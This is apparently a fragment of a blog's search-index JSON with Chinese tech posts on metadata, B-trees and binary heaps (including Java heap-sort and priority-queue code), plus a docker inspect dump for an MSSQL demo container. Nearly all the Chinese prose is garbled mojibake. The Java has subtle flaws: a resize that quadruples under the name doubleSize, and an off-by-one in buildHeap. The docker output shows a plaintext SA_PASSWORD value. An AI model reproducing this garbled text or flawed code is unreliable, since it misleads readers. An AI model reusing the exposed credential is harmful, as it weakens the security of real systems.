åè®®ç‰ˆæœ¬ï¼Œæ˜¯å“ªä¸€ä¸ªä¸Šå±‚åè®®åœ¨ä½¿ç”¨ IP åè®®ï¼ŒIP åŒ…æ˜¯å¦åˆ‡åˆ†äº†ï¼Œåˆ‡åˆ†åæ€æ ·ç»„è£…ï¼Œæ ¡éªŒæ•´ä¸ª IP åŒ…åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦å‘ç”Ÿäº†é”™è¯¯ç­‰ä¿¡æ¯ã€‚è®°åœ¨å“ªé‡Œå‘¢ï¼ŸIP headerï¼Œè¿™ä¸ª IP header å°±æ˜¯ Metadataã€‚è¿™äº›ä¹Ÿå¯ç†è§£æˆæ§åˆ¶æ•°æ®ã€‚\nTCP header TCP ä¼ è¾“å±‚çš„åè®®ã€‚ç”¨æ¥ä¿è¯æ•°æ®ä¸ä¸¢å¤±ä¸”æŒ‰ç…§å‘é€é¡ºåºåˆ°è¾¾ç›®çš„åœ°ã€‚ æ€æ ·ä¿è¯é¡ºåºå‘¢ï¼Ÿå¯¹æ¯ä¸€ä¸ªå­—èŠ‚ç¼–å·(sequence number)ã€‚ æ€æ ·ä¿è¯æ•°æ®ä¸ä¸¢å¤±å‘¢ï¼Ÿç¡®è®¤æœºåˆ¶(ack)ã€‚ æ€æ ·æ‰¾åˆ°ç›®çš„åœ°å‘¢ï¼Ÿä¸€ä¸ªåœ¨ç½‘ç»œä¸Šçš„è®¡ç®—æœºï¼Œå¯èƒ½åŒæ—¶è¿è¡Œè®¸å¤šç¨‹åºï¼Œå¦‚æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨çº¿å¬æ­Œï¼Œåœ¨çº¿ç¼–è¾‘æ–‡æ¡£ç­‰ç­‰ã€‚ç”¨ç«¯å£å·(port number)ã€‚ åŒæ—¶ï¼Œæ€æ ·çŸ¥é“æ¥æ”¶æ–¹ç°åœ¨æ¥æ”¶ç½‘ç»œåŒ…çš„å¤§å°å‘¢ï¼Ÿç”¨çª—å£(window size)ã€‚ æ€æ ·èƒ½çŸ¥é“ç½‘ç»œåŒ…ä¼ è¾“è¿‡ç¨‹æ˜¯å¦å‘ç”Ÿäº†é”™è¯¯ï¼Ÿç”¨æ ¡éªŒå’Œ(checksum)ã€‚ è¿™äº›ä¿¡æ¯éƒ½å­˜åœ¨å“ªé‡Œäº†å‘¢ï¼ŸTCP header é‡Œã€‚è¿™å°±æ˜¯ Metadataã€‚ä¹Ÿå¯ç†è§£æˆæ§åˆ¶æ•°æ®ã€‚\nInnoDB row format InnoDB å­˜å‚¨è¡¨æ˜¯æŒ‰è¡Œå­˜å‚¨çš„ã€‚è¿™åªæ˜¯é€»è¾‘ä¸Šçš„è¯´æ³•ã€‚çœŸæ­£çš„æ•°æ®å­˜å‚¨æ˜¯è¦è½åˆ°ç£ç›˜ä¸Šçš„ã€‚å¯¹äºæ¯ä¸€è¡Œï¼Œå­—æ®µæ˜¯ä¸æ˜¯ç©ºçš„ï¼Œå®šé•¿è¿˜æ˜¯å˜é•¿ï¼Œå˜é•¿å­—æ®µçš„é•¿åº¦ï¼Œè¯¥åˆ—çš„ä¸»é”®ï¼Œè¿™è¡Œæ•°æ®æ˜¯å“ªä¸€ä¸ªäº‹åŠ¡æ“ä½œçš„ï¼Œè¿™äº›è®°å½•çš„ç›¸å…³æ—¥å¿—éƒ½è®°åœ¨å“ªé‡Œäº†å‘¢ï¼Ÿ ä¸é”™ã€‚è¿™å…¶å®ä¹Ÿæ˜¯æœ‰ç›¸åº”çš„è¯´æ˜çš„ã€‚è€Œä¸”ï¼ŒInnoDB æä¾›äº†ä¸åŒçš„ row formatã€‚å¯¹ç”¨æˆ·çš„æ¯ä¸€è¡Œæ¥è¯´ï¼Œè¯¥è¡Œçš„ row format å°±æ˜¯ Metadataã€‚å½“ç„¶è¿™å°±æ˜¯æè¿°ï¼ˆæˆ–è€…è¯´æ˜¯æ§åˆ¶ï¼‰è¯¥è¡Œç”¨æˆ·æ•°æ®çš„ã€‚","reference#Reference":" Metadata what-is-metadata what-is-the-control-plane class file format InnoDB-row-format TTL "},"title":"data_and_metadata"},"/blog/data-structure-btree/":{"data":{"":"","#":"B-tree ç‰¹æ€§ æ‰€æœ‰çš„ leaves éƒ½åœ¨åŒä¸€å±‚çº§ã€‚ B-Tree è¢« minimum degree t å®šä¹‰ã€‚t ä¾èµ–äº disk block sizeã€‚ é™¤äº† rootï¼Œå…¶ä½™èŠ‚ç‚¹å¿…é¡»è‡³å°‘æœ‰ t - 1 ä¸ª keyã€‚root èŠ‚ç‚¹è‡³å°‘æœ‰ 1 ä¸ª keyã€‚ æ‰€æœ‰çš„èŠ‚ç‚¹ï¼ˆåŒ…æ‹¬ rootï¼‰æœ€å¤šæœ‰ 2t - 1 ä¸ª keyã€‚ æŸä¸€ä¸ªèŠ‚ç‚¹çš„å­èŠ‚ç‚¹çš„ä¸ªæ•° = è¿™ä¸ªèŠ‚ç‚¹çš„ key çš„ä¸ªæ•° + 1ã€‚ ä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰ key ä»å°åˆ°å¤§æ’åºã€‚ä¸¤ä¸ª key1 å’Œ key2 ä¹‹é—´çš„æ‰€æœ‰ child éƒ½åœ¨ key1 å’Œ key2 ä¹‹é—´ã€‚ B-Tree ä» root èŠ‚ç‚¹ grow(æ‰©å¼ ) å’Œ shrink(æ”¶ç¼©)ã€‚ searchã€insertã€delete æ—¶é—´å¤æ‚åº¦æ˜¯O(log n)ã€‚n æ˜¯ key çš„æ€»æ•°ã€‚ t=3 ä¸ºä¾‹æ¥ç†è§£ B-tree æ¯ä¸€ä¸ªèŠ‚ç‚¹(root é™¤å¤–) è‡³å°‘æœ‰ t - 1 = 2 ä¸ª keyã€‚ æ¯ä¸€ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰ 2t - 1 = 5 ä¸ª keyã€‚èŠ‚ç‚¹ key æ•°é‡ = 5ï¼Œç§°ä¸ºèŠ‚ç‚¹æ»¡äº†ã€‚ é—®é¢˜æ¥äº†ï¼ŒèŠ‚ç‚¹ key ä¸ªæ•°å¤§äº 5 äº†å’‹åŠï¼Ÿæ‹†åˆ†ã€‚ä»€ä¹ˆæ—¶å€™æ¥æ‹†åˆ†å‘¢ï¼Ÿåœ¨å‘ä¸‹éå†èŠ‚ç‚¹æ—¶å‘ç°æ»¡äº†ï¼Œç«‹å³è¿›è¡Œæ‹†åˆ†ã€‚ B-Tree insert operation æ‹†åˆ†å·²æ»¡èŠ‚ç‚¹ #(btree-æ‹†åˆ†å·²æ»¡èŠ‚ç‚¹)\nå¦‚ä¸Šå›¾ï¼ŒèŠ‚ç‚¹1 å·²ç»æ»¡äº†ï¼Œå¯¹æ­¤æ—¶çš„ root èŠ‚ç‚¹è¿›è¡Œæ‹†åˆ†ã€‚ åˆ›å»ºèŠ‚ç‚¹2ï¼Œs èŠ‚ç‚¹ï¼Œä½œä¸ºæ–°çš„ root èŠ‚ç‚¹ï¼ŒåŒæ—¶è®¾ç½® s.child[0] = rootã€‚ åˆ›å»ºèŠ‚ç‚¹2ï¼Œz èŠ‚ç‚¹ï¼Œå°†åŸæ¥ root èŠ‚ç‚¹ä¸€åŠçš„ keyï¼Œå¤åˆ¶åˆ° z èŠ‚ç‚¹ã€‚ å°† z èŠ‚ç‚¹è®¾ç½®ä¸º s èŠ‚ç‚¹çš„ childã€‚s.child[1] = zã€‚ æ‹†åˆ†å·²æ»¡èŠ‚ç‚¹(æœ‰å­èŠ‚ç‚¹) #(btree-æ‹†åˆ†å·²æ»¡èŠ‚ç‚¹2)\nB-Tree æ˜¯å‘ä¸Šæ‰©å¼ çš„(grow)ã€‚å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ key éƒ½æ˜¯åœ¨ leaf èŠ‚ç‚¹æ’å…¥çš„ã€‚èŠ‚ç‚¹çš„ key å€¼çš„æ•°é‡ä¸€æ—¦ç­‰äº 2t - 1 = 5 æ—¶ï¼Œå°±ä¼šå¯¹è¯¥èŠ‚ç‚¹è¿›è¡Œæ‹†åˆ†ã€‚æ‰€ä»¥è¿™ä¹Ÿæ˜¯æ¯ä¸€ä¸ªèŠ‚ç‚¹(root é™¤å¤–)è‡³å°‘æœ‰ t-1 = 2 ä¸ª key çš„åŸå› ã€‚\nB-Tree delete operation ","references#References":" BTree-visualization BTree introduction BTree insertion BTree deletion "},"title":"data-structure-btree"},"/blog/data-structure-heap/":{"data":{"":"","#":"çº¿æ€§ or éçº¿æ€§ æ•°æ®ç»“æ„å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼šçº¿æ€§ç»“æ„å’Œéçº¿æ€§ç»“æ„ã€‚çº¿æ€§ç»“æ„å…¸å‹çš„å°±æ˜¯æ•°ç»„å’Œé“¾è¡¨ï¼Œéçº¿æ€§å…¸å‹å°±æ˜¯æ ‘äº†ã€‚å¤æ‚çš„æ•°æ®ç»“æ„åŸºæœ¬ä¸Šéƒ½æ˜¯ä¸¤è€…çš„ç»„åˆã€‚\nbinary heap äºŒå‰å †æœ¬è´¨ä¸Šå°±æ˜¯ä¸ªå®Œå…¨äºŒå‰æ ‘ã€‚ä½†æ˜¯å´ç”¨æ•°ç»„æ¥è¡¨ç¤ºã€‚ä¸ºå•¥å‘¢ï¼Ÿå› ä¸ºæ•°ç»„çš„ä¸‹æ ‡ä¹‹é—´æœ‰å…³ç³»ï¼Œå¯ä»¥è¡¨ç¤ºäºŒå‰æ ‘èŠ‚ç‚¹ä¹‹é—´çš„å±‚çº§å…³ç³»ã€‚å› ä¸ºæ˜¯ å®Œå…¨äºŒå‰æ ‘ï¼Œè¿™å°±ä¿è¯äº†ä¸€ç»´å±•å¼€å°±æ˜¯ä¸€ä¸ªä¸‹æ ‡è¿ç»­çš„æ•°ç»„ï¼Œæ•°ç»„é€šè¿‡ä¸‹æ ‡æ“ä½œèµ·æ¥ç›¸å½“ç®€æ´ã€‚å †é¡¶(root)ä¹Ÿå°±æ˜¯æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´  array[0]ï¼Œæ˜¯æœ€å°å…ƒç´ ï¼Œå°±æ˜¯å°é¡¶å †ã€‚åä¹‹ï¼Œå¤§é¡¶å †ã€‚\nå †çš„è‡ªæˆ‘è°ƒæ•´ æ’å…¥èŠ‚ç‚¹ æ–°èŠ‚ç‚¹æ”¾åœ¨æ•°ç»„æœ€åï¼Œç„¶åå¯¹è¯¥èŠ‚ç‚¹è¿›è¡Œä¸Šæµ®æ“ä½œã€‚\nåˆ é™¤èŠ‚ç‚¹ åˆ é™¤å †é¡¶å…ƒç´ ï¼Œæœ€åä¸€ä¸ªèŠ‚ç‚¹æ”¾åœ¨å †é¡¶ï¼Œå¯¹æ­¤æ—¶çš„å †é¡¶è¿›è¡Œä¸‹æ²‰æ“ä½œã€‚\næ„å»ºäºŒå‰å † æ‰€æœ‰çš„éå¶å­èŠ‚ç‚¹è¿›è¡Œä¸Šæµ®æ“ä½œã€‚\näºŒå‰å †è‡ªæˆ‘è°ƒæ•´å›¾è§£ #(äºŒå‰å †çš„è‡ªæˆ‘è°ƒæ•´)\nä»£ç å®ç° import java.util.Arrays; public class HeapOperator { // è‡ªä¸‹è€Œä¸Šï¼Œä¸Šæµ® public static void upAdjust(int [] array){ // æœ€åä¸€ä¸ªèŠ‚ç‚¹ int childIndex = array.length - 1; // æœ€åä¸€ä¸ªéå¶å­èŠ‚ç‚¹ int parentIndex = (childIndex - 1) / 2; int temp = array[childIndex]; while (childIndex \u003e 0 \u0026\u0026 temp \u003c array[parentIndex]){ array[childIndex] = array[parentIndex]; childIndex = parentIndex; parentIndex = (childIndex - 1) / 2; } array[childIndex] = temp; } // è‡ªä¸Šè€Œä¸‹ï¼Œä¸‹æ²‰ public static void downAdjust(int [] array, int parentIndex, int length){ int temp = array[parentIndex]; int childIndex = 2 * parentIndex + 1; while (childIndex \u003c length){ // æœ‰å³èŠ‚ç‚¹ï¼Œä¸”å³èŠ‚ç‚¹å°äºå·¦èŠ‚ç‚¹ if (childIndex + 1 \u003c length \u0026\u0026 array[childIndex] \u003e array[childIndex + 1]){ childIndex++; } if(temp \u003c= array[childIndex]){ break; } array[parentIndex] = array[childIndex]; parentIndex = childIndex; childIndex = 2 * parentIndex + 1; } array[parentIndex] = temp; } public static void buildHeap(int[] array){ for (int i = (array.length - 1)/ 2; i \u003e= 0 ; i--) { downAdjust(array, i, array.length - 1); } } public static void heapSort(int [] array){ // å…ˆæ„å»ºä¸€ä¸ªå°é¡¶å †ï¼Œå¾—åˆ°ä¸€ä¸ªæœ€å°å€¼ã€‚ // i ä¸º parentIndexï¼Œå·¦å³å­èŠ‚ç‚¹åˆ†åˆ«æ˜¯ 2 * i + 1, 2 * i + 2 for (int i = (array.length - 1 -2 ) / 2; i \u003e= 0 ; i--) { downAdjust(array, i, array.length); } // å †é¡¶å’Œç›®å‰å †çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹äº¤æ¢ï¼Œé‡æ–°æ„å»ºå †ã€‚ for (int i = array.length - 1; i \u003e 0 ; i--) { int temp = array[i]; array[i] = array[0]; array[0] = temp; downAdjust(array, 0 , i); } } public static void main(String[] args){ int [] array = new int[]{1,3,2,6,5,7,8,9,10,0}; upAdjust(array); System.out.println(Arrays.toString(array)); int[] array2 = new int[]{7,1,3,10,5,2,8,9,6}; buildHeap(array2); System.out.println(Arrays.toString(array2)); int[] array3 = new int[]{7,1,3,10,5,2,8,9,6,100}; heapSort(array3); System.out.println(Arrays.toString(array3)); } } ä¼˜å…ˆçº§é˜Ÿåˆ— ä¸è¦è¢«é˜Ÿåˆ—äºŒå­—å¸¦åï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—çš„é‡ç‚¹åœ¨ä¼˜å…ˆçº§ä¸Šã€‚æ¯”å¦‚çº¿ç¨‹æœ‰ä¼˜å…ˆçº§ï¼Œä¼˜å…ˆçº§å¤§çš„å…ˆæ‰§è¡Œã€‚è¿ç®—ç¬¦ä¹Ÿæ˜¯æœ‰ä¼˜å…ˆçº§çš„ã€‚æ€æ ·æ¥å®ç°è¿™ç§ä¼˜å…ˆçº§å‘¢ï¼Ÿç”¨ å † å°±å¯ä»¥ã€‚è¿™é‡Œä½¿ç”¨å°é¡¶å †ï¼Œå †é¡¶å°±æ˜¯æœ€å°å€¼ï¼Œè¿™é‡Œå¸¦å…¥ä¼˜å…ˆçº§çš„æ¦‚å¿µï¼Œå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šå¤§ã€‚é‚£ä¹ˆï¼Œä»å †é¡¶æ‹¿å‡ºæ¥çš„èŠ‚ç‚¹å°±æ˜¯ä¼˜å…ˆçº§æœ€å¤§çš„ï¼Œå‰©ä½™çš„èŠ‚ç‚¹é‡æ–°æ„é€ æˆå°é¡¶å †ï¼Œä¿è¯å †é¡¶æ˜¯æœ€å°å€¼ã€‚\nä»£ç å®ç° å¤§é¡¶å †å®ç°ä¼˜å…ˆé˜Ÿåˆ—ã€‚æ¯æ¬¡åªå–æœ€å¤§å€¼ï¼Œå–å‡ºä¸€ä¸ªå †é¡¶ï¼Œå‰©ä½™èŠ‚ç‚¹é‡æ–°æ„å»ºå¤§é¡¶å †ã€‚\nimport java.util.Arrays; public class PriorityQueue { private int[] array; private int size; public PriorityQueue() { this.array = new int[32]; } private void enQueue(int key){ if(size \u003e= array.length){ resize(); } array[size++] = key; upAdjust(); } private int deQueue(){ int heapTop = array[0]; array[0] = array[--size]; downAdjust(); return heapTop; } private void resize() { int doubleSize = size \u003c\u003c 2; this.array = Arrays.copyOf(this.array,doubleSize); } // è‡ªä¸‹è€Œä¸Š private void upAdjust(){ // æ‹¿åˆ°æœ€åä¸€ä¸ªèŠ‚ç‚¹ int childIndex = this.size - 1; // æœ€åä¸€ä¸ªéå¶å­èŠ‚ç‚¹ int parentIndex = (childIndex - 1) / 2; int temp = array[childIndex]; while (childIndex \u003e 0 \u0026\u0026 temp \u003e array[parentIndex]){ array[childIndex] = array[parentIndex]; childIndex = parentIndex; parentIndex = (childIndex - 1) / 2; } array[childIndex] = temp; } // è‡ªä¸Šè€Œä¸‹ private void downAdjust(){ int parentIndex = 0; int temp = array[0]; int childIndex = 1; while (childIndex \u003c size){ // æœ‰å³èŠ‚ç‚¹ï¼Œä¸”å³èŠ‚ç‚¹å¤§äºå·¦èŠ‚ç‚¹ã€‚æ‹¿åˆ°ä¸¤ä¸ªå­èŠ‚ç‚¹çš„æœ€å¤§å€¼ã€‚ if (childIndex + 1 \u003c size \u0026\u0026 array[childIndex] \u003c array[childIndex + 1]){ childIndex++; } if(temp \u003e= array[childIndex]){ break; } array[parentIndex] = array[childIndex]; parentIndex = childIndex; childIndex = 2 * parentIndex + 1; } array[parentIndex] = temp; } public static void main(String[] args){ PriorityQueue priorityQueue = new PriorityQueue(); priorityQueue.enQueue(30); priorityQueue.enQueue(100); priorityQueue.enQueue(50); priorityQueue.enQueue(300); priorityQueue.enQueue(130); priorityQueue.enQueue(430); System.out.println(priorityQueue.deQueue()); System.out.println(priorityQueue.deQueue()); System.out.println(priorityQueue.deQueue()); } } References visual heap binary heap heap sort priority queue full binary tree vs complete binary tree heap review "},"title":"data-structure-heap"},"/blog/data-structure-red-black-tree/":{"data":{"":"","references#References":"\nReferences red-black-tree-visualization "},"title":"data-structure-red-black-tree"},"/blog/docker-practice/":{"data":{"":" Centos7 Linux è¿è¡Œçš„ Docker å®¹å™¨æ˜¯: mssql-node-docker-demo-app","container-ç½‘ç»œé…ç½®#Container ç½‘ç»œé…ç½®":" #(å®¹å™¨çš„ç½‘ç»œé…ç½®)","docker-images-åˆ†å±‚#Docker Images åˆ†å±‚":" { \"GraphDriver\": { \"Name\": \"overlay2\", \"Data\": { \"LowerDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2-init/diff:/var/lib/docker/overlay2/83b7194d94d42c0ef8f78a2f4105cc7a7a215a8e885b695a933a8f8212db9cfa/diff:/var/lib/docker/overlay2/9549118d3883d39414fadf0dc17e654d1408878be3296b294711ee65ef336b98/diff:/var/lib/docker/overlay2/8e85764472e79d42f469dd3681883cd415e85098d6c42fb3dd239471212f87b3/diff:/var/lib/docker/overlay2/8dc8ec519bade76b07994adc690d1e6fcad408147835198a250b4c66c489a151/diff:/var/lib/docker/overlay2/b07d1c7463b2a4ff25f7800729381fdf5b036c12a065973b9d079580c3a50a5e/diff:/var/lib/docker/overlay2/60c9257cc9d8a7ac4b66d1c4cae5ff994471976f0a344f8ac1856a4fba7b290e/diff:/var/lib/docker/overlay2/2a00c5b47427e151e000ffe05de8121e956dbf15b0d356cfc9ad2754dc5554d5/diff:/var/lib/docker/overlay2/3495bcc2d508cbdad81b1f3eb49645fe0eb05caf0e99fbb6310d40fbdd8118a2/diff:/var/lib/docker/overlay2/9df322481c6f8b91b3583016634664e6ad991b8b846a9585385227a02b898770/diff:/var/lib/docker/overlay2/163747850da2115bac28b39ac6d2e08ca5c0e409fe6cae624155f8e61489aacd/diff:/var/lib/docker/overlay2/52405978404b67e0a67ba95cb12682d0e8a8ae781fd2b21dc2ab94197e97c38b/diff:/var/lib/docker/overlay2/c987c31253bca839eb789feb3e4fe7bc247b1e88dc88c67e2b4209fc26025fe8/diff:/var/lib/docker/overlay2/ed663d4b2fffda783f9b69e5eb7c139f34142e0e2d868460a3c1e1d925ec3e7e/diff:/var/lib/docker/overlay2/a0e3d07a65b7ee70d3869fa41418ecf71056b9ac0ba1182170621c83c77bba94/diff:/var/lib/docker/overlay2/aa4c66b37aae4e55a94aa60ac763a60851af34271ccb1a80f547e3d90e7ac2bf/diff:/var/lib/docker/overlay2/527b1a014d302c1fe835d778be6cd008de6741d290fbc0f2e64e3f25f7a7b8d0/diff\", \"MergedDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/merged\", \"UpperDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/diff\", \"WorkDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/work\" } } } MergedDir è¿™ä¸ª MergedDir å±‚å°±æ˜¯ä¸€ä¸ª Linux é•œåƒ\n#( é•œåƒ Merged å±‚)","docker-info#docker info":" #(docker-info)","docker-inspect#docker inspect":" [ { \"Id\": \"405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655\", \"Created\": \"2019-08-01T02:57:14.067532309Z\", \"Path\": \"/bin/sh\", \"Args\": [ \"-c\", \"/bin/bash ./entrypoint.sh\" ], \"State\": { \"Status\": \"running\", \"Running\": true, \"Paused\": false, \"Restarting\": false, \"OOMKilled\": false, \"Dead\": false, \"Pid\": 12164, \"ExitCode\": 0, \"Error\": \"\", \"StartedAt\": \"2019-08-22T06:08:43.334320939Z\", \"FinishedAt\": \"2019-08-21T09:25:32.130119566Z\" }, \"Image\": \"sha256:e600f86aa4e2aced43a193a28aa507651bfb77daa09ca8dbf286451a630cf27e\", // node-web-app çš„ docker é•œåƒ id \"ResolvConfPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/resolv.conf\", \"HostnamePath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hostname\", \"HostsPath\": \"/var/lib/docker/containers/405a378d6f88f903dda5972dbfb8f037efff22296c3aaf4c50d44ebd68ad8655/hosts\", \"LogPath\": \"\", \"Name\": \"/friendly_hamilton\", // docker container çš„åç§° \"RestartCount\": 0, \"Driver\": \"overlay2\", // storage driver \"MountLabel\": \"\", \"ProcessLabel\": \"\", \"AppArmorProfile\": \"\", \"ExecIDs\": null, \"HostConfig\": { \"Binds\": null, \"ContainerIDFile\": \"\", \"LogConfig\": { \"Type\": \"journald\", \"Config\": {} }, \"NetworkMode\": \"default\", \"PortBindings\": { \"1433/tcp\": [ { \"HostIp\": \"\", \"HostPort\": \"1433\" } ], \"8080/tcp\": [ { \"HostIp\": \"\", \"HostPort\": \"8080\" } ] }, \"RestartPolicy\": { \"Name\": \"no\", \"MaximumRetryCount\": 0 }, \"AutoRemove\": false, \"VolumeDriver\": \"\", \"VolumesFrom\": null, \"CapAdd\": null, \"CapDrop\": null, \"Dns\": [], \"DnsOptions\": [], \"DnsSearch\": [], \"ExtraHosts\": null, \"GroupAdd\": null, \"IpcMode\": \"\", \"Cgroup\": \"\", \"Links\": null, \"OomScoreAdj\": 0, \"PidMode\": \"\", \"Privileged\": false, \"PublishAllPorts\": false, \"ReadonlyRootfs\": false, \"SecurityOpt\": null, \"UTSMode\": \"\", \"UsernsMode\": \"\", \"ShmSize\": 67108864, \"Runtime\": \"docker-runc\", \"ConsoleSize\": [ 0, 0 ], \"Isolation\": \"\", \"CpuShares\": 0, \"Memory\": 0, \"NanoCpus\": 0, \"CgroupParent\": \"\", \"BlkioWeight\": 0, \"BlkioWeightDevice\": null, \"BlkioDeviceReadBps\": null, \"BlkioDeviceWriteBps\": null, \"BlkioDeviceReadIOps\": null, \"BlkioDeviceWriteIOps\": null, \"CpuPeriod\": 0, \"CpuQuota\": 0, \"CpuRealtimePeriod\": 0, \"CpuRealtimeRuntime\": 0, \"CpusetCpus\": \"\", \"CpusetMems\": \"\", \"Devices\": [], \"DiskQuota\": 0, \"KernelMemory\": 0, \"MemoryReservation\": 0, \"MemorySwap\": 0, \"MemorySwappiness\": -1, \"OomKillDisable\": false, \"PidsLimit\": 0, \"Ulimits\": null, \"CpuCount\": 0, \"CpuPercent\": 0, \"IOMaximumIOps\": 0, \"IOMaximumBandwidth\": 0 }, \"GraphDriver\": { \"Name\": \"overlay2\", \"Data\": { \"LowerDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2-init/diff:/var/lib/docker/overlay2/83b7194d94d42c0ef8f78a2f4105cc7a7a215a8e885b695a933a8f8212db9cfa/diff:/var/lib/docker/overlay2/9549118d3883d39414fadf0dc17e654d1408878be3296b294711ee65ef336b98/diff:/var/lib/docker/overlay2/8e85764472e79d42f469dd3681883cd415e85098d6c42fb3dd239471212f87b3/diff:/var/lib/docker/overlay2/8dc8ec519bade76b07994adc690d1e6fcad408147835198a250b4c66c489a151/diff:/var/lib/docker/overlay2/b07d1c7463b2a4ff25f7800729381fdf5b036c12a065973b9d079580c3a50a5e/diff:/var/lib/docker/overlay2/60c9257cc9d8a7ac4b66d1c4cae5ff994471976f0a344f8ac1856a4fba7b290e/diff:/var/lib/docker/overlay2/2a00c5b47427e151e000ffe05de8121e956dbf15b0d356cfc9ad2754dc5554d5/diff:/var/lib/docker/overlay2/3495bcc2d508cbdad81b1f3eb49645fe0eb05caf0e99fbb6310d40fbdd8118a2/diff:/var/lib/docker/overlay2/9df322481c6f8b91b3583016634664e6ad991b8b846a9585385227a02b898770/diff:/var/lib/docker/overlay2/163747850da2115bac28b39ac6d2e08ca5c0e409fe6cae624155f8e61489aacd/diff:/var/lib/docker/overlay2/52405978404b67e0a67ba95cb12682d0e8a8ae781fd2b21dc2ab94197e97c38b/diff:/var/lib/docker/overlay2/c987c31253bca839eb789feb3e4fe7bc247b1e88dc88c67e2b4209fc26025fe8/diff:/var/lib/docker/overlay2/ed663d4b2fffda783f9b69e5eb7c139f34142e0e2d868460a3c1e1d925ec3e7e/diff:/var/lib/docker/overlay2/a0e3d07a65b7ee70d3869fa41418ecf71056b9ac0ba1182170621c83c77bba94/diff:/var/lib/docker/overlay2/aa4c66b37aae4e55a94aa60ac763a60851af34271ccb1a80f547e3d90e7ac2bf/diff:/var/lib/docker/overlay2/527b1a014d302c1fe835d778be6cd008de6741d290fbc0f2e64e3f25f7a7b8d0/diff\", \"MergedDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/merged\", \"UpperDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/diff\", \"WorkDir\": \"/var/lib/docker/overlay2/efead8cb8732e4ccfc24485c253d02838842d6dfd9a2ee60a9142c69cb54f4a2/work\" } }, \"Mounts\": [ { \"Type\": \"volume\", \"Name\": \"7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834\", \"Source\": \"/var/lib/docker/volumes/7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834/_data\", // host ä¸»æœºçš„è¢«æŒ‚åœ¨çš„ç›®å½• \"Destination\": \"/var/opt/mssql\", // Volume æŒ‚è½½ç‚¹ \"Driver\": \"local\", \"Mode\": \"\", \"RW\": true, \"Propagation\": \"\" } ], \"Config\": { \"Hostname\": \"405a378d6f88\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"ExposedPorts\": { \"1433/tcp\": {}, \"8080/tcp\": {} }, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"ACCEPT_EULA=Y\", \"SA_PASSWORD=Yukon900\", \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" ], \"Cmd\": [ \"/bin/sh\", \"-c\", \"/bin/bash ./entrypoint.sh\" ], \"ArgsEscaped\": true, \"Image\": \"node-web-app\", \"Volumes\": { \"/var/opt/mssql\": {} }, \"WorkingDir\": \"/usr/src/app\", \"Entrypoint\": null, \"OnBuild\": null, \"Labels\": { \"com.microsoft.product\": \"Microsoft SQL Server\", \"com.microsoft.version\": \"14.0.3048.4\", \"vendor\": \"Microsoft\" } }, \"NetworkSettings\": { \"Bridge\": \"\", \"SandboxID\": \"d21ee4834e9078042da65677d8db9717748eb7f86a6954c5e4eee29636159aa7\", \"HairpinMode\": false, \"LinkLocalIPv6Address\": \"\", \"LinkLocalIPv6PrefixLen\": 0, \"Ports\": { \"1433/tcp\": [ { \"HostIp\": \"0.0.0.0\", \"HostPort\": \"1433\" } ], \"8080/tcp\": [ { \"HostIp\": \"0.0.0.0\", \"HostPort\": \"8080\" } ] }, \"SandboxKey\": \"/var/run/docker/netns/d21ee4834e90\", \"SecondaryIPAddresses\": null, \"SecondaryIPv6Addresses\": null, \"EndpointID\": \"46dac1ff81a297ede919100e0d06a743b845e34b802b54bca8cb8f02dcd33c85\", \"Gateway\": \"172.17.0.1\", \"GlobalIPv6Address\": \"\", \"GlobalIPv6PrefixLen\": 0, \"IPAddress\": \"172.17.0.2\", \"IPPrefixLen\": 16, \"IPv6Gateway\": \"\", \"MacAddress\": \"02:42:ac:11:00:02\", \"Networks\": { \"bridge\": { \"IPAMConfig\": null, \"Links\": null, \"Aliases\": null, \"NetworkID\": \"a8af0599996912141c3f2ce4b0a2bcc48eea9164a35672aac6307333450acb6b\", //a8af05999969 \"EndpointID\": \"46dac1ff81a297ede919100e0d06a743b845e34b802b54bca8cb8f02dcd33c85\", \"Gateway\": \"172.17.0.1\", \"IPAddress\": \"172.17.0.2\", \"IPPrefixLen\": 16, \"IPv6Gateway\": \"\", \"GlobalIPv6Address\": \"\", \"GlobalIPv6PrefixLen\": 0, \"MacAddress\": \"02:42:ac:11:00:02\" } } } } ] ","docker-volume#docker volume":"mount \"Mounts\": [ { \"Type\": \"volume\", \"Name\": \"7bc1a7ad23925077cf8463c2d7a21b0cafc7d91305d89504f85fa76c33138834\", \"Source\": 